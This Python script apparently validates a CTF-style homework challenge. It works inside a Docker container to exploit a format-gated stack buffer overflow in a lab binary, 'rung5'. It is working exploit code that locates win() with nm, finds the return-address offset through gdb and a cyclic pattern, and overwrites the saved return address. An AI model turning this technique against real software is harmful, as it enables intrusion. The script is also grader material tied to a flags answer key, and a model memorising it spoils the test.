#!/usr/bin/env python3
"""Known-good exploit for rung5 (format-gated overflow) — proof of solvability.

Drives a live enigma-homework container from the HOST via docker exec.
The gate: input must start with "PWN5" (bytes 4-7 ignored) or the binary
prints "bad magic" and exits cleanly. Behind it: 512 bytes into a 96-byte
stack buffer. win's address from nm (static, non-PIE), offset from gdb on a
header-prefixed cyclic pattern (expect 104, NOT 72).

Usage: python3 solve_rung5.py <container_id_or_name>
Exit code 0 on PASS, 1 on FAIL.
"""
import json
import os
import re
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

HEADER = b"PWN5\x00\x00\x00\x00"


def docker_exec(cid, cmd, input_bytes=None, timeout=120):
    return subprocess.run(["docker", "exec", "-i", cid] + cmd,
                          input=input_bytes, capture_output=True,
                          timeout=timeout)


def cyclic(n, subseq=4):
    k = 26
    alphabet = [chr(ord('a') + i) for i in range(k)]
    a = [0] * (k * subseq)
    seq = []

    def db(t, p):
        if t > subseq:
            if subseq % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in seq).encode()[:n]


def discover_offset(cid, binary, fallback=104):
    """Offset from buf start to the saved retaddr. The crash pattern must
    carry the PWN5 header or the binary exits at the magic gate instead."""
    pat = HEADER + cyclic(256)
    docker_exec(cid, ["bash", "-c", "cat > /tmp/pat.bin"], input_bytes=pat)
    r = docker_exec(cid, ["gdb", "-q", "-batch",
                          "-ex", "run /tmp/pat.bin",
                          "-ex", "info registers rip",
                          "-ex", "x/1gx $rsp",
                          binary])
    body = pat[len(HEADER):]
    m = re.search(rb"rip\s+(0x[0-9a-f]+)", r.stdout)
    if m:
        rip = int(m.group(1), 16)
        off = body.find(struct.pack("<Q", rip)[:4])
        if off >= 0:
            print("[*] crash rip = 0x%x -> offset %d" % (rip, off))
            return off
    m = re.search(rb"0x[0-9a-f]+:\s+(0x[0-9a-f]+)", r.stdout)
    if m:
        slot = int(m.group(1), 16)
        off = body.find(struct.pack("<Q", slot))
        if off >= 0:
            print("[*] non-canonical ret; slot @rsp = 0x%x -> offset %d"
                  % (slot, off))
            return off
    print("[!] gdb offset inconclusive, fallback %d" % fallback)
    return fallback


def solve(cid):
    expected = json.load(open(os.path.join(HERE, "flags.json")))["rung5"]

    # 0. The gate: without the magic, the binary must reject cleanly.
    r = docker_exec(cid, ["bash", "-c", "printf 'AAAAAAAA' > /tmp/bad.bin && /target/rung5 /tmp/bad.bin"])
    if b"bad magic" not in r.stdout:
        print("FAIL: format gate did not reject malformed input:\n"
              + r.stdout.decode(errors="replace"))
        return False
    print("[*] format gate verified: malformed input -> 'bad magic'")

    # 1. win() address.
    r = docker_exec(cid, ["nm", "/target/rung5"])
    m = re.search(rb"^([0-9a-f]+) [Tt] win$", r.stdout, re.M)
    if not m:
        print("FAIL: win not found:\n" + r.stdout.decode(errors="replace"))
        return False
    win_addr = int(m.group(1), 16)
    print("[*] win @ 0x%x" % win_addr)

    # 2. Offset (header-prefixed pattern; expect 104).
    offset = discover_offset(cid, "/target/rung5")

    # 3. Deliver: header + padding + retaddr.
    payload = HEADER + b"A" * offset + struct.pack("<Q", win_addr)
    docker_exec(cid, ["bash", "-c", "cat > /tmp/payload.bin"], input_bytes=payload)
    r = docker_exec(cid, ["/target/rung5", "/tmp/payload.bin"])
    out = r.stdout
    print("[*] target output:\n" + out.decode(errors="replace").strip())

    got = re.search(rb"flag\{[^}]*\}", out)
    if got and got.group(0).decode() == expected:
        print("PASS: rung5 solved, flag matches flags.json: %s" % expected)
        return True
    print("FAIL: expected %s, got %s"
          % (expected, got.group(0).decode() if got else None))
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(0 if solve(sys.argv[1]) else 1)
